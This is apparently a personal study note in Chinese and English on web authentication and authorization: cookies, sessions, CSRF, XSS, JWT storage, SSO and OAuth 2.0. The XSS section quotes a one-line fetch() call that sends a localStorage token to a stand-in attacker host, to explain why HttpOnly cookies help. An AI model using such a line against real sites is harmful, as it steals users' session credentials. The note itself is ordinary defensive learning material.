## System Design

### 认证 & 授权

#### - Basic Concept

##### Difference

* **Authentication**: user with username and password 
* **Authorization**: Based on roles.

##### RBAC

> Role-based access control: based on the roles to assign permissions.

<img src="/Users/franklin/Desktop/NO_Drive/Code/myWeb/Note/Screenshot/image-20251207170816162.png" alt="image-20251207170816162" style="zoom:50%;" />



##### Cookie

> `Cookies` 是某些网站为了辨别用户身份而储存在用户本地终端上的数据（通常经过加密）。
>
> 存放在**客户端**，一般用来保存用户信息

Application:

* 保存已经登录过的用户信息
* 用来记录和分析用户行为, 看了哪些商品
* 保存 `SessionId` 



##### Session

> `Session` 的主要作用就是通过**服务端**记录用户的状态，安全性更高
>
> Since `HTTP` is stateless, we can use session to track user activity

Problem:

* **客户端 Cookie 支持**：依赖 Session 的核心功能要确保用户浏览器开启了 Cookie。
* **Session 过期管理**：合理设置 Session 的过期时间，平衡安全性和用户体验。
* **Session ID 安全**：为包含 `SessionID` 的 Cookie 设置 `HttpOnly` 标志可以防止客户端脚本（如 JavaScript）窃取，设置 Secure 标志可以保证 `SessionID` 只在 HTTPS 连接下传输，增加安全性。

* [Getting Started with Spring Session](https://codeboje.de/spring-Session-tutorial/)
* [Guide to Spring Session](https://www.baeldung.com/spring-Session)
* [Sticky Sessions with Spring Session & Redis](https://medium.com/@gvnix/sticky-Sessions-with-spring-Session-redis-bdc6f7438cc3)



##### Info Secure

###### - CSRF

> Cross-Site Request Forgery

Token is save from CSRF, because localStorage **cannot** be stolen by CSRF. But the main prob is **XSS**.



###### - XSS

> Cross-Site Scripting

Cookie and Token cannot prevent attacks from XSS, injected with js. If an attacker manages to run JavaScript on your site (XSS), like using the web extension, they can steal it: 

```js
fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));
```

Cookie + HttpOnly can prevent XSS attacks.

`HttpOnly` is a cookie flag that tells the browser:

> “This cookie must NOT be accessible by JavaScript.”



###### - HTTPS

> HTTPS encrypts everything inside the HTTP request/response.

Encrypted:

* HTTP request body (Everything send in POST/PUT: password, form data.)
* HTTP headers (Cookies, JWT token)
* Response body

Not encrypted:

* Local content: Local Storage, Session Storage, cookies in browser.



##### Jwt token 

* Stored in HttpOnly Cookie.
* Refresh token
* Validate CSRF token header.
* Same-site policy (reduce CSRF)

Same Site vs Origin

> Same Origin: protocol, domain, port have to be the same. Not allowing subdomain, used for JS
>
> Same Site: checks registrable domain, only affected on cookies, not JS
>
> * ```javascript
>   // same
>   example.com
>   www.example.com
>   api.example.com
>   ```



##### SSO

> Single Sign On: 用户登陆多个子系统的其中一个就有权访问与其相关的其他系统

**Benefits**:

* **用户角度** :用户能够做到一次登录多次使用，无需记录多套用户名和密码，省心。
* **系统管理员角度** : 管理员只需维护好一个统一的账号中心就可以了，方便。
* **新系统开发角度:** 新系统开发时只需直接对接统一的账号中心即可，简化开发流程，省时。



##### OAuth 2.0

> OAuth 是一个行业的标准授权协议，主要用来授权第三方应用获取有限的权限

Authorization grant:

* 授权码（authorization-code）
* 隐藏式（implicit）
* 密码式（password）：
* 客户端凭证（client credentials）

完整[Demo](https://www.ruanyifeng.com/blog/2019/04/github-oauth.html)







## Frontend

MPA

Works for requesting real time data

SPA

For oftenly direct to different path like tweeting, SPA could save time without frequently sending requests, just loading data.

SPA vs MPA

MPA provides authentication on different pages in the server. SPA, however, have to write logics in JS

